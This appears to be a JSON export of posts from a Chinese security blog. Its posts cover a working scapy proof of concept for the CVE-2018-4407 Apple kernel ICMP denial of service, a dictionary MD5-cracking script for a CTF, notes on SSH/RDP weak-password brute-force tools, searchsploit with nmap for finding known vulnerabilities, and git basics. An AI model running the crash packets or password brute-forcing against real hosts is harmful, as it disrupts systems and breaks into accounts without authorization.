[{"content":"\r\n\r\n\r\ncheck_icmp_dos.py:\r\n\r\n```\r\n# CVE-2018-4407 ICMP DOS \r\n# https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407 \r\n# from https://twitter.com/ihackbanme \r\nimport sys \r\ntry: \r\n\tfrom scapy.all import * \r\nexcept Exception as e: \r\n\tprint (\"[*] You need install scapy first:\\n[*] sudo pip install scapy \") \r\n\t\r\nif __name__ == '__main__': \r\n\ttry: \r\n\t\tcheck_ip = sys.argv[1] \r\n\t\tprint (\"[*] !!!!!!Dangerous operation!!!!!!\") \r\n\t\tprint (\"[*] Trying CVE-2018-4407 ICMP DOS \" + check_ip) \r\n\t\tfor i in range(8,20): \r\n\t\t\tsend(IP(dst=check_ip,options=[IPOption(\"A\"*i)])/TCP(dport=2323,options=[(19,\"1\"*18),(19,\"2\"*18)])) \r\n\t\tprint (\"[*] Check Over!! \") \r\n\texcept Exception as e: \r\n\t\tprint \"[*] usage: sudo python check_icmp_dos.py 127.0.0.1\" \r\n```\r\n\r\n![cve-2018-4407](/images/cve-2018-4407.png)","cover":"/images/cve-2018-4407.png","link":"cve-2018-4407.html","preview":"\u003cp\u003e影响苹果系统哦\u003cdel\u003e不更新IOS12就捣蛋呦\u003c/del\u003e\u003c/p\u003e\n","title":"CVE-2018-4407苹果操作系统内核堆缓冲区溢出漏洞验证POC"},{"content":"\r\nCTF比赛中遇到需要爆破MD5的题，于是就用Python写了一个破解MD5的脚本（能不能成功破解全看字典）,运行速度不高大佬勿喷：\r\n\r\n```\r\ndef main():\r\n\toldmd5='e10adc3949ba59abbe56e057f20f883e'  #这里写的是需要破解的MD5\r\n\tf = open('superdic.txt','r+')              #这里要把明文的密码字典写上（注意路径问题）\r\n\twhile True:\r\n\t\tline = f.readline()\r\n\t\tif len(line) == 0:\r\n\t\t\tbreak\r\n\t\t\tf.close()\r\n\t\t\tprint('PASSWOWD NOT FOUND')\r\n\t\tos.system('cls')\r\n\t\t#print line\r\n\t\tpasswdmd5=line.strip()\r\n\t\th = md5.new()\r\n\t\th.update(passwdmd5)\r\n\t\tif h.hexdigest() == oldmd5:\r\n\t\t\tf.close()\r\n\t\t\tprint('PASSWOWD FOUND:\\n'+line)\r\n\t\t\tbreak\r\nif __name__ == '__main__':\r\n\tmain()\r\n```\r\n\r\n运行图：\r\n\r\n![crackmd5.py](/images/crackmd5.png)","cover":"/images/crackmd5.png","link":"crackmd5.html","preview":"\u003cp\u003e一个用Python写的破解MD5的脚本，不用彩虹表\u003c/p\u003e\n","title":"使用Python破解MD5(非彩虹表)"},{"content":"\r\n![超级弱口令检查工具V1.0](/images/about-ssh-rdp-tools-headimage.png)\r\n\r\n使用这个“超级弱口令检查工具V1.0”批量检测了一下ssh和rdp存在弱口令的主机，发现了一个坑爹的事情：\r\n\r\n这货在破解RDP的弱口令时竟然会出错（但是爆破SSH是没问题的）！一爆破RDP就弹窗报错，然后程序崩溃，若是你没有及时保存爆破结果的话，爆破结果就全部丢失了。所同志们要记住别用这货爆破RDP服务。。。\r\n\r\n为啥会报错呢？这个原因暂时不明，我电脑是win10的，难道是爆破RDP的dll跟win10不兼容？？？\r\n \r\n好吧，那么RDP协议的爆破用什么呢？我这有一款非常不错的windowns下使用的爆破工具，叫做“frdpb_v2”，感觉这货稳定，靠谱。下面是软件截图：\r\n\r\n![frdpb_v2](/images/about-ssh-rdp-tools-frdp.png)\r\n\r\nPS:\r\n\r\n* 目前能够摆在各种论坛下载站任人下载的各种国产爆破工具多半有后门，用了之后没抓到肉鸡自己先成鸡了，所以为了安全同志们最好在GitHub之类的开源站上下载正规的开源安全测试工具(kali系统自带的那些也行)，再不行学三天python自己写一个爆破工具（我准备写一个，不过也就想想，能不能完成另外说。）","cover":"/images/about-ssh-rdp-tools-headimage.png","link":"about-ssh-rdp-tools.html","preview":"\u003cp\u003e在正式使用“超级弱口令检查工具V1.0 Beta17 20171217”之后，发现了一些坑爹的问题\u003c/p\u003e\n","title":"超级弱口令检查工具V1.0 Beta17 20171217和frdpb_v2的一点使用心得"},{"content":"\r\n\r\n\r\n首先放出searchsploit 的部分说明：\r\n\r\n![searchsploit 的部分说明](/images/searchsploit-namp-1.png)\r\n\r\n```\r\n=========\r\n Options\r\n=========\r\n   -c, --case [Term] Perform a case-sensitive search (Default is inSEnsITiVe).\r\n   -e, --exact [Term] Perform an EXACT match on exploit title (Default is AND) [Implies \"-t\"].\r\n   -h, --help Show this help screen.\r\n   -j, --json [Term] Show result in JSON format.\r\n   -m, --mirror [EDB-ID] Mirror (aka copies) an exploit to the current working directory.\r\n   -o, --overflow [Term] Exploit titles are allowed to overflow their columns.\r\n   -p, --path [EDB-ID] Show the full path to an exploit (and also copies the path to the clipboard if possible).\r\n   -t, --title [Term] Search JUST the exploit title (Default is title AND the file's path).\r\n   -u, --update Check for and install any exploitdb package updates (deb or git).\r\n   -w, --www [Term] Show URLs to Exploit-DB.com rather than the local path.\r\n   -x, --examine [EDB-ID] Examine (aka opens) the exploit using $PAGER.\r\n       --colour Disable colour highlighting in search results.\r\n       --id Display the EDB-ID value rather than local path.\r\n       --nmap [file.xml] Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).\r\n                                Use \"-v\" (verbose) to try even more combinations\r\n       --exclude=\"term\" Remove values from results. By using \"|\" to separated you can chain multiple values.\r\n                                e.g. --exclude=\"term1|term2|term3\".\r\n\r\n```\r\n\r\n可以看到有这么一行\r\n```--nmap [file.xml] Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).```\r\n所以我们可以用nmap对模板进行扫描然后让searchsploit从nmap的xml格式扫描结果里面检查是否有已知的组件漏洞。nmap扫描参数里面必须包含 -v (e.g.: nmap -sV -oX file.xml)\r\n\r\n扫描完成后这么调用：\r\n\r\n```searchsploit --nmap file.xml```\r\n\r\n可能有如下提示：\r\n\r\n```\r\n[!] Please install xmllint\r\n[i] Kali Linux -\u003e apt -y install libxml2-utils\r\n```\r\n\r\n这样需要我们先执行命令```apt -y install libxml2-utils```安装libxml2-utils，\r\n\r\n![安装libxml2-utils](/images/searchsploit-namp-2.png)\r\n\r\n安装完毕后再执行\r\n\r\n```searchsploit --nmap file.xml```\r\n\r\n回显如下：\r\n\r\n```\r\n[i] SearchSploit's XML mode (without verbose enabled). To enable: searchsploit -v --xml...\r\n[i] Reading: 'file.xml'\r\n\r\n[i] /usr/local/bin/searchsploit -t apache httpd 2 4 28\r\n...\r\n```\r\n\r\n![回显](/images/searchsploit-namp-3.png)","cover":"/images/searchsploit-namp-1.png","link":"searchsploit-namp.html","preview":"\u003cp\u003e我们可以用nmap对模板进行扫描然后让searchsploit从nmap的xml格式扫描结果里面检查是否有已知的组件漏洞\u003c/p\u003e\n","title":"使用searchsploit 搭配nmap扫描结果自动寻找组件漏洞"},{"content":"\r\n\r\n1. ```git clone https://github.com/LxKxC/LxKxC.github.io.git #``` 将仓库克隆 到本地\r\n\r\n2. 进入到本地仓库文件夹 将想要删除的文件删除\r\n\r\n3. 右键 ```git bash here```\r\n\r\n4. ```git add .```\r\n\r\n5. ```git commit -m \"say some thing \"```  双引号中内容按照自己需求填写\r\n\r\n6. ```git push -u origin master```","cover":"/images/use-git.png","link":"use-git.html","preview":"\u003cp\u003egit的简单操作，给自己备忘\u003c/p\u003e\n","title":"删除 github 相应仓库下的文件（不删除仓库）"}]